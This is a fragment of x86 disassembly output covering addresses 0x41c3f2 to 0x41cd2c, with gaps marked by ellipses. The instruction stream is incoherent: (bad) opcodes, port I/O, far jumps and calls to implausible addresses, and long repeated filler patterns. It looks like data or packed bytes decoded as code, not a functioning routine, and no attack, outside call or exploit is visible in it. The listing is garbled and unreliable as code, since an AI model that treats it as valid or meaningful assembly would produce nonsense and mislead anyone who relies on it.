  41c3f2:	or     dl,BYTE PTR [esi]
  41c3f4:	lock push eax
  41c3f6:	sub    bl,BYTE PTR [eax+ecx*1]
  41c3f9:	push   eax
  41c3fa:	scas   eax,DWORD PTR es:[edi]
  41c3fb:	ja     0x41c3f5
  41c3fd:	dec    DWORD PTR [eax]
  41c3ff:	out    dx,al
  41c400:	inc    eax
  41c401:	call   0x1101a02d
  41c406:	les    edx,FWORD PTR [edx-0x5fe70731]
  41c40c:	push   0x42903e4c
  41c411:	add    BYTE PTR [ebx+0x5650c9b7],bh
  41c417:	xchg   edi,eax
  41c418:	retf   0xfd
	...
  41c443:	add    BYTE PTR [ecx-0x74],bl
  41c446:	cmp    eax,0x7e83ff74
  41c44b:	inc    ebx
  41c44c:	dec    esi
  41c44d:	aam    0xd9
  41c44f:	ins    DWORD PTR es:[edi],dx
  41c450:	inc    edi
  41c451:	xor    eax,0xc88a68cb
  41c456:	inc    edx
  41c457:	add    bl,al
  41c459:	mov    esi,0xe31650d9
  41c45e:	retf   0x21fd
  41c461:	jmp    0xb707c092
  41c466:	rol    DWORD PTR [edi+0x5b7a687b],1
  41c46c:	push   cs
  41c46d:	stc    
  41c46e:	sub    al,0xf4
  41c470:	mov    ch,0x3e
  41c472:	fadd   QWORD PTR [edi+0x5b7a8883]
  41c478:	out    0x1b,al
  41c47a:	shl    BYTE PTR [edi+edi*2-0x7c],0x7e
  41c47f:	inc    ebx
  41c480:	out    0x53,al
  41c482:	fdivr  QWORD PTR [ecx]
  41c484:	xlat   BYTE PTR ds:[ebx]
  41c485:	lods   al,BYTE PTR ds:[esi]
  41c486:	int3   
  41c487:	push   0x413002
  41c48c:	mov    ebx,0xd650d436
  41c491:	xchg   dl,cl
  41c493:	std    
  41c494:	mov    ecx,0xff74c04b
  41c499:	cmp    DWORD PTR [esi+0x43],0xffffff96
  41c49d:	xor    ebx,esp
  41c49f:	sbb    eax,0x89ccd4a7
  41c4a4:	sti    
  41c4a5:	out    dx,eax
  41c4a6:	ja     0x41c4eb
	...
  41c4d0:	add    BYTE PTR [eax],al
  41c4d2:	mov    ?,edx
  41c4d4:	inc    ebp
  41c4d5:	cld    
  41c4d6:	mov    bh,0x5e
  41c4d8:	aam    0x89
  41c4da:	jecxz  0x41c536
  41c4dc:	pop    ebx
  41c4dd:	js     0x41c4dc
  41c4df:	xor    BYTE PTR [eax+0x46],0x6a
  41c4e3:	jecxz  0x41c499
  41c4e5:	fcmovnbe st,st(6)
  41c4e7:	push   ds
  41c4e8:	aam    0x42
  41c4ea:	ds loopne 0x41c499
  41c4ed:	retf   
  41c4ee:	out    dx,al
  41c4ef:	add    BYTE PTR [eax-0x35],0x53
  41c4f3:	ins    DWORD PTR es:[edi],dx
  41c4f4:	mov    edi,0xe71bcd3f
  41c4f9:	jle    0x41c4f8
  41c4fb:	push   0xffffffb7
  41c4fd:	(bad)  [edi]
  41c4ff:	je     0x41c51f
  41c501:	int3   
  41c502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c503:	pop    ds
  41c504:	pushf  
  41c505:	inc    edx
  41c506:	fisub  WORD PTR ds:[ebx+ebx*8-0x34db7c72]
  41c50e:	sbb    ebp,DWORD PTR [ebp-0x6b]
  41c511:	jle    0x41c590
  41c513:	jae    0x41c4ac
  41c515:	fcmovnb st,st(2)
  41c517:	jae    0x41c507
  41c519:	retf   
  41c51a:	mov    ch,0x15
  41c51c:	out    dx,eax
  41c51d:	xor    eax,ebp
  41c51f:	push   ss
  41c520:	xlat   BYTE PTR ds:[ebx]
  41c521:	xor    al,0xe6
  41c523:	in     al,0xce
  41c525:	retf   
  41c526:	jmp    0x41c500
  41c528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c529:	hlt    
  41c52a:	mov    ebx,esi
  41c52c:	sub    al,0xdc
  41c52e:	outs   dx,BYTE PTR ds:[esi]
  41c52f:	adc    DWORD PTR [ecx-0x34],0xffffffd3
  41c533:	ins    BYTE PTR es:[edi],dx
  41c534:	adc    eax,0x2f
	...
  41c55d:	add    BYTE PTR [eax],al
  41c55f:	add    cl,al
  41c561:	jg     0x41c56f
  41c563:	(bad)  
  41c564:	ss pop ebx
  41c566:	cmp    al,0x7d
  41c568:	popf   
  41c569:	fimul  DWORD PTR [ebx-0x18934e88]
  41c56f:	adc    BYTE PTR ss:[edx+eiz*2],al
  41c573:	sub    DWORD PTR [esi],esi
  41c575:	loopne 0x41c573
  41c577:	test   esp,0x93ca67d6
  41c57d:	ins    BYTE PTR es:[edi],dx
  41c57e:	add    BYTE PTR [ecx],bl
  41c580:	push   0x7
  41c582:	(bad)  
  41c583:	outs   dx,BYTE PTR ds:[esi]
  41c584:	jne    0x41c587
  41c586:	add    cl,dl
  41c588:	mov    cl,0xe8
  41c58a:	ds jmp 0x573d3a25
  41c590:	jne    0x41c5ce
  41c592:	shl    BYTE PTR [ebx-0x48],cl
  41c595:	lahf   
  41c596:	jae    0x41c540
  41c598:	cmp    eax,0xfbfb04e3
  41c59d:	fsqrt  
  41c59f:	rol    DWORD PTR [ecx],1
  41c5a1:	jl     0x41c568
  41c5a3:	fs repnz ins BYTE PTR es:[edi],dx
  41c5a6:	std    
  41c5a7:	es inc ebx
  41c5a9:	pop    ebx
  41c5aa:	add    cl,ch
  41c5ac:	adc    BYTE PTR [edi],al
  41c5ae:	xchg   DWORD PTR [ecx],ebx
  41c5b0:	stos   DWORD PTR es:[edi],eax
  41c5b1:	fdiv   DWORD PTR [edi+ecx*1-0xb]
  41c5b5:	ins    DWORD PTR es:[edi],dx
  41c5b6:	das    
  41c5b7:	sbb    edi,ecx
  41c5b9:	sub    cl,BYTE PTR [ecx-0x292919c]
  41c5bf:	test   BYTE PTR [edx+0xef7cd8],0x0
	...
  41c5ee:	hlt    
  41c5ef:	ins    DWORD PTR es:[edi],dx
  41c5f0:	std    
  41c5f1:	ins    BYTE PTR es:[edi],dx
  41c5f2:	mov    DWORD PTR [ebp-0x3],ebp
  41c5f5:	fidiv  WORD PTR [eax-0x20]
  41c5f8:	jl     0x41c5d1
  41c5fa:	hlt    
  41c5fb:	ins    DWORD PTR es:[edi],dx
  41c5fc:	or     eax,0xe0da388f
  41c601:	inc    esi
  41c602:	pop    ecx
  41c603:	mov    al,0x7c
  41c605:	mov    edi,0x7f0d6e04
  41c60a:	xor    al,0x3c
  41c60c:	clc    
  41c60d:	popa   
  41c60e:	cmp    dl,BYTE PTR [ebp+0x1900e901]
  41c614:	and    DWORD PTR [ebx+0x6902f0a5],0xa7735b38
  41c61e:	outs   dx,DWORD PTR ds:[esi]
  41c61f:	add    eax,0xa14700e8
  41c624:	sti    
  41c625:	jmp    DWORD PTR [ebx+edi*4]
  41c628:	js     0x41c628
  41c62a:	adc    BYTE PTR [ecx+0x57cc8000],ah
  41c630:	jno    0x41c5d9
  41c632:	in     al,0xe2
  41c634:	js     0x41c634
  41c636:	adc    BYTE PTR [ecx-0xd0e8b00],ah
  41c63c:	add    BYTE PTR [eax+0x50fba0f1],0xef
  41c643:	mov    eax,ds:0x4110fff9
  41c648:	pop    esi
  41c649:	pop    ebx
  41c64a:	fiadd  WORD PTR [ebx+0x575fc259]
  41c650:	push   ecx
  41c651:	mov    DWORD PTR [eax],eax
	...
  41c67b:	add    BYTE PTR [edx+0x2e],cl
  41c67e:	push   eax
  41c67f:	push   ebx
  41c680:	jmp    0x9c4a176e
  41c685:	xor    ecx,DWORD PTR [ebx+ecx*4]
  41c688:	retf   0x2e6e
  41c68b:	leave  
  41c68c:	lea    ebp,[edx+0xe]
  41c68f:	mov    bl,bl
  41c691:	arpl   bp,si
  41c693:	mov    bl,BYTE PTR [ebx]
  41c695:	jo     0x41c61c
  41c697:	add    al,0xee
  41c699:	pop    ds
  41c69a:	jg     0x41c695
  41c69c:	out    dx,eax
  41c69d:	and    ch,cl
  41c69f:	push   ebx
  41c6a0:	xor    eax,0x10faac87
  41c6a5:	xchg   ebp,eax
  41c6a6:	sub    eax,0x176382d2
  41c6ab:	mov    ch,bl
  41c6ad:	push   eax
  41c6ae:	xor    al,BYTE PTR [ecx]
  41c6b0:	dec    edi
  41c6b1:	pop    esi
  41c6b2:	inc    edx
  41c6b3:	or     DWORD PTR [ebp-0x390f8699],0xffffffb0
  41c6ba:	mov    al,BYTE PTR [edx+edi*4-0x6a]
  41c6be:	mov    BYTE PTR [edx*4+0x3efa7f20],al
  41c6c5:	jl     0x41c70c
  41c6c7:	icebp  
  41c6c8:	add    BYTE PTR ds:0xb5fbec79,ch
  41c6ce:	clc    
  41c6cf:	call   DWORD PTR [ecx+0x3e000174]
  41c6d5:	je     0x41c6d8
  41c6d7:	add    BYTE PTR [esi],bh
  41c6d9:	je     0x41c6dc
  41c6db:	add    BYTE PTR [esi],bh
  41c6dd:	je     0x41c6e0
	...
  41c707:	add    BYTE PTR [eax],al
  41c709:	add    BYTE PTR [esi],bh
  41c70b:	je     0x41c70e
  41c70d:	add    BYTE PTR [esi],bh
  41c70f:	je     0x41c712
  41c711:	add    BYTE PTR [esi],bh
  41c713:	je     0x41c716
  41c715:	add    BYTE PTR [esi],bh
  41c717:	je     0x41c71a
  41c719:	add    BYTE PTR [esi],bh
  41c71b:	je     0x41c71e
  41c71d:	add    BYTE PTR [esi],bh
  41c71f:	je     0x41c722
  41c721:	add    BYTE PTR [esi],bh
  41c723:	je     0x41c726
  41c725:	add    BYTE PTR [esi],bh
  41c727:	je     0x41c72a
  41c729:	add    BYTE PTR [esi],bh
  41c72b:	je     0x41c72e
  41c72d:	add    BYTE PTR [esi],bh
  41c72f:	je     0x41c732
  41c731:	add    BYTE PTR [esi],bh
  41c733:	je     0x41c736
  41c735:	add    BYTE PTR [esi],bh
  41c737:	je     0x41c73a
  41c739:	add    BYTE PTR [esi],bh
  41c73b:	je     0x41c73e
  41c73d:	add    BYTE PTR [esi],bh
  41c73f:	je     0x41c742
  41c741:	add    BYTE PTR [esi],bh
  41c743:	je     0x41c746
  41c745:	add    BYTE PTR [esi],bh
  41c747:	je     0x41c74a
  41c749:	add    BYTE PTR [esi],bh
  41c74b:	je     0x41c74e
  41c74d:	add    BYTE PTR [esi],bh
  41c74f:	je     0x41c752
  41c751:	add    BYTE PTR [esi],bh
  41c753:	je     0x41c756
  41c755:	add    BYTE PTR [esi],bh
  41c757:	je     0x41c75a
  41c759:	add    BYTE PTR [esi],bh
  41c75b:	je     0x41c75e
  41c75d:	add    BYTE PTR [esi],bh
  41c75f:	je     0x41c762
  41c761:	add    BYTE PTR [esi],bh
  41c763:	je     0x41c766
  41c765:	add    BYTE PTR [esi],bh
  41c767:	pop    ebx
  41c768:	out    0x3,eax
  41c76a:	ds pop ebx
  41c76c:	out    0x3,eax
	...
  41c796:	add    BYTE PTR [eax],al
  41c798:	ds pop ebx
  41c79a:	out    0x3,eax
  41c79c:	ds pop ebx
  41c79e:	out    0x3,eax
  41c7a0:	ds pop ebx
  41c7a2:	out    0x3,eax
  41c7a4:	ds pop ebx
  41c7a6:	out    0x3,eax
  41c7a8:	ds pop ebx
  41c7aa:	out    0x3,eax
  41c7ac:	ds pop ebx
  41c7ae:	out    0x3,eax
  41c7b0:	ds pop ebx
  41c7b2:	out    0x3,eax
  41c7b4:	ds pop ebx
  41c7b6:	out    0x3,eax
  41c7b8:	ds pop ebx
  41c7ba:	out    0x3,eax
  41c7bc:	ds pop ebx
  41c7be:	out    0x3,eax
  41c7c0:	ds pop ebx
  41c7c2:	out    0x3,eax
  41c7c4:	ds pop ebx
  41c7c6:	out    0x3,eax
  41c7c8:	ds pop ebx
  41c7ca:	out    0x3,eax
  41c7cc:	ds pop ebx
  41c7ce:	out    0x3,eax
  41c7d0:	ds pop ebx
  41c7d2:	out    0x3,eax
  41c7d4:	ds pop ebx
  41c7d6:	out    0x3,eax
  41c7d8:	ds pop ebx
  41c7da:	in     al,0xfd
  41c7dc:	xor    al,0x55
  41c7de:	mov    BYTE PTR [ebx],dh
  41c7e0:	mov    dh,dl
  41c7e2:	mov    BYTE PTR [ebx],ah
  41c7e4:	mov    BYTE PTR [edx],ch
  41c7e6:	int    0x13
  41c7e8:	pop    ecx
  41c7e9:	cmp    eax,edi
  41c7eb:	push   ss
  41c7ec:	pop    esi
  41c7ed:	cmp    esi,DWORD PTR [ebx+0x5b]
  41c7f0:	pop    ebp
  41c7f1:	cmp    ebx,DWORD PTR [edx+0x59]
  41c7f4:	xchg   ecx,eax
  41c7f5:	test   DWORD PTR [edx+0x61],0x5c5b3b6c
	...
  41c824:	add    BYTE PTR [eax],al
  41c826:	pop    ebp
  41c827:	cmp    ecx,DWORD PTR [ecx+0x61]
  41c82a:	push   edx
  41c82b:	out    dx,eax
  41c82c:	dec    ebx
  41c82d:	push   edx
  41c82e:	push   ds
  41c82f:	and    eax,0x1c37f910
  41c834:	add    BYTE PTR [esi+0x6a],al
  41c837:	lock jno 0x41c87a
  41c83a:	sbb    ebx,esi
  41c83c:	jae    0x41c807
  41c83e:	push   ebp
  41c83f:	cli    
  41c840:	es leave 
  41c842:	push   edx
  41c843:	xor    BYTE PTR [edi],dh
  41c845:	rol    DWORD PTR [esi+0x2d],1
  41c848:	xor    cl,bl
  41c84a:	dec    edx
  41c84b:	cmp    esp,DWORD PTR [edx+0x0]
  41c84e:	pop    edx
  41c84f:	adc    eax,0xfdec046d
  41c854:	bound  eax,QWORD PTR [edi]
  41c856:	pop    edx
  41c857:	and    BYTE PTR [edx-0x6],ah
  41c85a:	fdivp  st(0),st
  41c85c:	sub    ecx,DWORD PTR [ecx]
  41c85e:	sti    
  41c85f:	imul   BYTE PTR [ebx+0x9]
  41c862:	sub    al,0x0
  41c864:	gs shl ecx,0xe9
  41c868:	pop    ds
  41c869:	mov    ebx,0xbb62e9de
  41c86e:	add    edi,esp
  41c870:	arpl   WORD PTR [edi],cx
  41c872:	inc    edi
  41c873:	push   edx
  41c874:	or     esp,ebx
  41c876:	push   es
  41c877:	div    BYTE PTR [ecx-0x3c]
  41c87a:	pop    ebp
  41c87b:	add    BYTE PTR [esi-0x71],ch
  41c87e:	mov    ch,ch
  41c880:	push   0xffffff88
  41c882:	jns    0x41c884
  41c884:	ins    DWORD PTR es:[edi],dx
  41c885:	xchg   DWORD PTR [edi],esi
  41c887:	cmp    ebp,DWORD PTR [eax-0x6b]
	...
  41c8b2:	add    BYTE PTR [eax],al
  41c8b4:	mov    ebx,ebp
  41c8b6:	cmp    esi,edx
  41c8b8:	sub    dh,ch
  41c8ba:	je     0x41c932
  41c8bc:	xor    eax,DWORD PTR [eax]
  41c8be:	bound  edi,QWORD PTR [edx-0x62]
  41c8c1:	stc    
  41c8c2:	jo     0x41c942
  41c8c4:	fwait
  41c8c5:	out    dx,eax
  41c8c6:	je     0x41c910
  41c8c8:	mov    esp,?
  41c8ca:	sub    eax,0x2cf4914a
  41c8cf:	in     al,0xe7
  41c8d1:	push   esp
  41c8d2:	or     ch,cl
  41c8d4:	cmp    eax,0xe700005b
  41c8d9:	pop    ebx
  41c8da:	add    BYTE PTR [eax],al
  41c8dc:	xlat   BYTE PTR ds:[ebx]
  41c8dd:	pop    ebx
  41c8de:	add    BYTE PTR [eax],al
  41c8e0:	xlat   BYTE PTR ds:[ebx]
  41c8e1:	pop    ebx
  41c8e2:	add    BYTE PTR [eax],al
  41c8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e5:	pop    ebx
  41c8e6:	add    BYTE PTR [eax],al
  41c8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e9:	pop    ebx
  41c8ea:	add    BYTE PTR [eax],al
  41c8ec:	xchg   edi,eax
  41c8ed:	pop    ebx
  41c8ee:	add    BYTE PTR [eax],al
  41c8f0:	xchg   edi,eax
  41c8f1:	pop    ebx
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8f5:	pop    ebx
  41c8f6:	add    BYTE PTR [eax],al
  41c8f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8f9:	pop    ebx
  41c8fa:	add    BYTE PTR [eax],al
  41c8fc:	xchg   edi,eax
  41c8fd:	pop    ebx
  41c8fe:	add    BYTE PTR [eax],al
  41c900:	xchg   edi,eax
  41c901:	pop    ebx
  41c902:	add    BYTE PTR [eax],al
  41c904:	addr16 pop ebx
  41c906:	add    BYTE PTR [eax],al
  41c908:	addr16 pop ebx
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	push   edi
  41c90d:	pop    ebx
  41c90e:	add    BYTE PTR [eax],al
  41c910:	retf   0x4ed8
  41c913:	imul   esp,DWORD PTR [esi],0x3b
  41c916:	sub    DWORD PTR [eax+eax*1],eax
	...
  41c941:	add    BYTE PTR [ecx],dl
  41c943:	mov    dh,0x54
  41c945:	in     al,dx
  41c946:	sub    bh,BYTE PTR [edx-0x2587d29e]
  41c94c:	pop    es
  41c94d:	push   edi
  41c94e:	cmp    ah,BYTE PTR [ebp+0x5]
  41c951:	adc    ebx,esp
  41c953:	ins    DWORD PTR es:[edi],dx
  41c954:	gs in  al,0xef
  41c957:	adc    al,0x4f
  41c959:	mov    ss,WORD PTR [edi]
  41c95b:	pop    ebx
  41c95c:	add    BYTE PTR [eax],al
  41c95e:	daa    
  41c95f:	pop    ebx
  41c960:	add    BYTE PTR [eax],al
  41c962:	daa    
  41c963:	pop    ebx
  41c964:	add    BYTE PTR [eax],al
  41c966:	pop    ss
  41c967:	pop    ebx
  41c968:	add    BYTE PTR [eax],al
  41c96a:	pop    ss
  41c96b:	pop    ebx
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	out    0x5a,eax
  41c970:	add    BYTE PTR [eax],al
  41c972:	out    0x5a,eax
  41c974:	add    BYTE PTR [eax],al
  41c976:	xlat   BYTE PTR ds:[ebx]
  41c977:	pop    edx
  41c978:	add    BYTE PTR [eax],al
  41c97a:	ds je  0x41c97e
  41c97d:	add    BYTE PTR [esi],bh
  41c97f:	je     0x41c982
  41c981:	add    BYTE PTR [esi],bh
  41c983:	je     0x41c986
  41c985:	add    BYTE PTR [esi],bh
  41c987:	je     0x41c98a
  41c989:	add    BYTE PTR [esi],bh
  41c98b:	je     0x41c98e
  41c98d:	add    BYTE PTR [esi],bh
  41c98f:	je     0x41c992
  41c991:	add    BYTE PTR [esi],bh
  41c993:	je     0x41c996
  41c995:	add    BYTE PTR [esi],bh
  41c997:	je     0x41c99a
  41c999:	add    BYTE PTR [esi],bh
  41c99b:	je     0x41c99e
  41c99d:	add    BYTE PTR [esi],bh
  41c99f:	je     0x41c9a2
  41c9a1:	add    BYTE PTR [esi],bh
  41c9a3:	je     0x41c9a6
	...
  41c9cd:	add    BYTE PTR [eax],al
  41c9cf:	add    BYTE PTR [esi],bh
  41c9d1:	je     0x41c9d4
  41c9d3:	add    BYTE PTR [esi],bh
  41c9d5:	je     0x41c9d8
  41c9d7:	add    BYTE PTR [esi],bh
  41c9d9:	je     0x41c9dc
  41c9db:	add    BYTE PTR [esi],bh
  41c9dd:	je     0x41c9e0
  41c9df:	add    BYTE PTR [esi],bh
  41c9e1:	je     0x41c9e4
  41c9e3:	add    BYTE PTR [esi],bh
  41c9e5:	je     0x41c9e8
  41c9e7:	add    BYTE PTR [esi],bh
  41c9e9:	je     0x41c9ec
  41c9eb:	add    BYTE PTR [esi],bh
  41c9ed:	je     0x41c9f0
  41c9ef:	add    BYTE PTR [esi],bh
  41c9f1:	je     0x41c9f4
  41c9f3:	add    BYTE PTR [esi],bh
  41c9f5:	je     0x41c9f8
  41c9f7:	add    BYTE PTR [esi],bh
  41c9f9:	je     0x41c9fc
  41c9fb:	add    BYTE PTR [esi],bh
  41c9fd:	je     0x41ca00
  41c9ff:	add    BYTE PTR [esi],bh
  41ca01:	je     0x41ca04
  41ca03:	add    BYTE PTR [esi],bh
  41ca05:	je     0x41ca08
  41ca07:	add    BYTE PTR [esi],bh
  41ca09:	je     0x41ca0c
  41ca0b:	add    BYTE PTR [esi],bh
  41ca0d:	je     0x41ca10
  41ca0f:	add    BYTE PTR [esi],bh
  41ca11:	je     0x41ca14
  41ca13:	add    BYTE PTR [esi],bh
  41ca15:	je     0x41ca18
  41ca17:	add    BYTE PTR [esi],bh
  41ca19:	je     0x41ca1c
  41ca1b:	add    BYTE PTR [esi],bh
  41ca1d:	pop    ebx
  41ca1e:	out    0x3,eax
  41ca20:	ds pop ebx
  41ca22:	out    0x3,eax
  41ca24:	ds pop ebx
  41ca26:	out    0x3,eax
  41ca28:	ds pop ebx
  41ca2a:	out    0x3,eax
  41ca2c:	ds pop ebx
  41ca2e:	out    0x3,eax
  41ca30:	ds pop ebx
  41ca32:	out    0x3,eax
	...
  41ca5c:	add    BYTE PTR [eax],al
  41ca5e:	ds pop ebx
  41ca60:	out    0x3,eax
  41ca62:	ds pop ebx
  41ca64:	out    0x3,eax
  41ca66:	ds pop ebx
  41ca68:	out    0x3,eax
  41ca6a:	ds pop ebx
  41ca6c:	out    0x3,eax
  41ca6e:	ds pop ebx
  41ca70:	out    0x3,eax
  41ca72:	ds pop ebx
  41ca74:	out    0x3,eax
  41ca76:	ds pop ebx
  41ca78:	out    0x3,eax
  41ca7a:	ds pop ebx
  41ca7c:	out    0x3,eax
  41ca7e:	ds pop ebx
  41ca80:	out    0x3,eax
  41ca82:	ds pop ebx
  41ca84:	out    0x3,eax
  41ca86:	ds pop ebx
  41ca88:	out    0x3,eax
  41ca8a:	ds pop ebx
  41ca8c:	out    0x3,eax
  41ca8e:	ds pop ebx
  41ca90:	out    0x3,eax
  41ca92:	ds pop ebx
  41ca94:	out    0x3,eax
  41ca96:	ds pop ebx
  41ca98:	out    0x3,eax
  41ca9a:	ds pop ebx
  41ca9c:	out    0x3,eax
  41ca9e:	ds pop ebx
  41caa0:	out    0x3,eax
  41caa2:	ds pop ebx
  41caa4:	out    0x3,eax
  41caa6:	ds pop ebx
  41caa8:	out    0x3,eax
  41caaa:	ds pop ebx
  41caac:	out    0x3,eax
  41caae:	ds pop ebx
  41cab0:	fcom   DWORD PTR [ecx]
  41cab2:	dec    edi
  41cab3:	das    
  41cab4:	aam    0xd
  41cab6:	ds jmp 0x41ca40
  41cab9:	push   eax
  41caba:	(bad)  
  41cabb:	in     al,dx
  41cabc:	lea    edx,[ecx-0x66]
  41cabf:	pop    ebx
  41cac0:	add    BYTE PTR [ecx+0x0],bh
	...
  41caeb:	add    BYTE PTR [ebp+0x3d8b61eb],dl
  41caf1:	hlt    
  41caf2:	je     0x41cb40
  41caf4:	xor    bh,ch
  41caf6:	jbe    0x41cae1
  41caf8:	jmp    0x6764:0xd71d312a
  41caff:	inc    esp
  41cb00:	or     eax,ebp
  41cb02:	jo     0x41caed
  41cb04:	shr    BYTE PTR [edx],cl
  41cb06:	xor    ebp,esi
  41cb08:	(bad)  
  41cb09:	cs xor eax,0x32343df1
  41cb0f:	cli    
  41cb10:	test   eax,0x610b6064
  41cb15:	xor    al,0x32
  41cb17:	fidivr DWORD PTR ds:0x4f1d62f7
  41cb1d:	clc    
  41cb1e:	data16 (bad) 
  41cb20:	cmp    eax,0x51fa62ef
  41cb25:	pop    ebx
  41cb26:	ins    BYTE PTR es:[edi],dx
  41cb27:	push   cs
  41cb28:	inc    esp
  41cb29:	clc    
  41cb2a:	push   DWORD PTR [edi-0x6ffd48d]
  41cb30:	sbb    ch,dl
  41cb32:	jo     0x41cb12
  41cb34:	sub    al,0xe9
  41cb36:	arpl   WORD PTR [eax],bx
  41cb38:	cmp    dh,bl
  41cb3a:	(bad)  
  41cb3b:	lds    ebp,FWORD PTR [ecx]
  41cb3d:	idiv   bh
  41cb3f:	mov    ebx,0xcc68f50c
  41cb44:	or     bl,BYTE PTR [ebx+0x64]
  41cb47:	mov    ebx,0xc76cfe1a
  41cb4c:	cmp    eax,0xb471ef
	...
  41cb79:	add    BYTE PTR [eax-0x11],ch
  41cb7c:	ins    DWORD PTR es:[edi],dx
  41cb7d:	xchg   esi,eax
  41cb7e:	xor    ah,BYTE PTR [eax+esi*1-0x28]
  41cb82:	sub    dh,BYTE PTR ds:0xfc3dd82f
  41cb88:	imul   edi,DWORD PTR [esi+0x57],0xfffffff8
  41cb8c:	jbe    0x41cb8e
  41cb8e:	mov    al,0x22
  41cb90:	add    BYTE PTR [ecx],dh
  41cb92:	lds    ebp,FWORD PTR [ecx+esi*1+0x35]
  41cb96:	mov    ecx,0xbf72fd60
  41cb9b:	ds outs dx,DWORD PTR fs:[esi]
  41cb9e:	mov    BYTE PTR [edi+0x2d],bl
  41cba1:	xor    al,BYTE PTR [ebx+eiz*2+0x32]
  41cba5:	cmp    BYTE PTR ss:[edi+0x36],ah
  41cba9:	add    BYTE PTR [edi+esi*1+0x23046972],al
  41cbb0:	add    BYTE PTR [ebx+0xa],dh
  41cbb3:	sub    DWORD PTR [edi+0x68],ebp
  41cbb6:	(bad)  
  41cbb7:	sub    BYTE PTR [ecx+0x0],ah
  41cbba:	jb     0x41cbfa
  41cbbc:	outs   dx,DWORD PTR ds:[esi]
  41cbbd:	je     0x41cbf9
  41cbbf:	sub    eax,0x2a306300
  41cbc4:	jo     0x41cc3b
  41cbc6:	cmp    esi,DWORD PTR [edx]
  41cbc8:	jb     0x41cbca
  41cbca:	aaa    
  41cbcb:	sub    eax,0x32346e65
  41cbd0:	outs   dx,DWORD PTR ds:[esi]
  41cbd1:	jae    0x41cb6a
  41cbd3:	sub    esp,DWORD PTR [ebp+0x67]
  41cbd6:	dec    eax
  41cbd7:	xor    dh,BYTE PTR [edx+0x0]
  41cbda:	cmp    DWORD PTR [eax],ebp
  41cbdc:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x0
	...
  41cc05:	add    BYTE PTR [eax],al
  41cc07:	add    BYTE PTR [ebp+0x3e],dh
  41cc0a:	ins    BYTE PTR es:[edi],dx
  41cc0b:	ins    BYTE PTR es:[edi],dx
  41cc0c:	push   edi
  41cc0d:	outs   dx,BYTE PTR ds:[esi]
  41cc0f:	mov    dh,BYTE PTR [bp+di]
  41cc12:	add    BYTE PTR [edx+0x7a],ch
  41cc15:	sub    al,0x71
  41cc17:	jae    0x41cc5f
  41cc19:	push   edi
  41cc1a:	sub    eax,0x2f6e4432
  41cc1f:	xor    esp,DWORD PTR [edi]
  41cc21:	es push 0x7633eb61
  41cc27:	lds    ebx,FWORD PTR gs:[esi+0x66]
  41cc2b:	jb     0x41cbe7
  41cc2d:	xor    esp,DWORD PTR [edi+ebp*2+0x3e]
  41cc31:	xlat   BYTE PTR ds:[ebx]
  41cc32:	add    DWORD PTR [ecx-0x59],ebp
  41cc35:	loopne 0x41cc63
  41cc37:	arpl   WORD PTR [esp+esi*2-0x25658edc],cx
  41cc3e:	add    DWORD PTR [ecx+0x69],esi
  41cc41:	aad    0x26
  41cc43:	arpl   WORD PTR [esp+esi*2+0x36],bp
  41cc47:	jae    0x41ccb7
  41cc49:	(bad)  
  41cc4b:	imul   ebx,DWORD PTR [edi+0x12],0x4
  41cc4f:	imul   esp,DWORD PTR [edi+0x15],0x2c
  41cc53:	pop    edi
  41cc54:	pop    ebx
  41cc55:	and    BYTE PTR [ecx+eiz*2],al
  41cc58:	push   esi
  41cc59:	(bad)  
  41cc5b:	jno    0x41ccb8
  41cc5d:	je     0x41cc89
  41cc5f:	outs   dx,BYTE PTR ds:[esi]
  41cc60:	xor    cl,BYTE PTR [edi]
  41cc62:	outs   dx,BYTE PTR ss:[esi]
  41cc64:	sbb    ebp,DWORD PTR [eax]
  41cc66:	add    al,0x6a
  41cc68:	sbb    DWORD PTR [ebp+0x2c],eax
  41cc6b:	jae    0x41cc6d
	...
  41cc95:	add    BYTE PTR [edi],bl
  41cc97:	je     0x41ccc0
  41cc99:	jae    0x41ccb8
  41cc9b:	pop    ebp
  41cc9c:	cmp    DWORD PTR [ebp+0xb],ebp
  41cc9f:	je     0x41ccc4
  41cca1:	ins    BYTE PTR es:[edi],dx
  41cca2:	and    esp,DWORD PTR [ebp+0x34]
  41cca5:	arpl   WORD PTR [edx],bx
  41cca7:	je     0x41cccc
  41cca9:	pop    edi
  41ccaa:	in     eax,dx
  41ccab:	dec    esi
  41ccac:	es pop edi
  41ccae:	loop   0x41cd0f
  41ccb0:	add    DWORD PTR [ecx-0xe],esi
  41ccb3:	xchg   edx,eax
  41ccb4:	xor    esi,DWORD PTR [ebp-0x21]
  41ccb7:	test   DWORD PTR [eax+eax*1],esi
  41ccba:	push   cs
  41ccbb:	inc    esp
  41ccbc:	hlt    
  41ccbd:	das    
  41ccbe:	push   cs
  41ccbf:	inc    esp
  41ccc0:	add    al,0x70
  41ccc2:	shl    DWORD PTR [ebp+0x73db6c31],cl
  41ccc8:	sub    ebp,DWORD PTR [ebp-0x54]
  41cccb:	nop
  41cccc:	and    ch,BYTE PTR [esi+0x3e]
  41cccf:	call   0x38f:0x5bb26722
  41ccd6:	scas   eax,DWORD PTR es:[edi]
  41ccd7:	call   0xeddefb67
  41ccdc:	out    0x22,al
  41ccde:	(bad)  
  41ccdf:	repz jp 0x41cd08
  41cce2:	xchg   ecx,eax
  41cce3:	pop    ebx
  41cce4:	mov    DWORD PTR [esi],esi
  41cce6:	(bad)  
  41cce7:	out    0x83,eax
  41cce9:	xor    eax,0x228bf33e
  41ccee:	push   0x6e037cf8
  41ccf3:	clc    
  41ccf4:	push   esi
  41ccf5:	xor    al,0x5d
  41ccf7:	in     eax,dx
  41ccf8:	out    0xf8,al
	...
  41cd22:	add    BYTE PTR [eax],al
  41cd24:	adc    ch,BYTE PTR [edx]
  41cd26:	push   ds
  41cd27:	stc    
  41cd28:	or     ch,BYTE PTR [edx]
  41cd2a:	out    0x2b,eax
  41cd2c:	dec    ebp
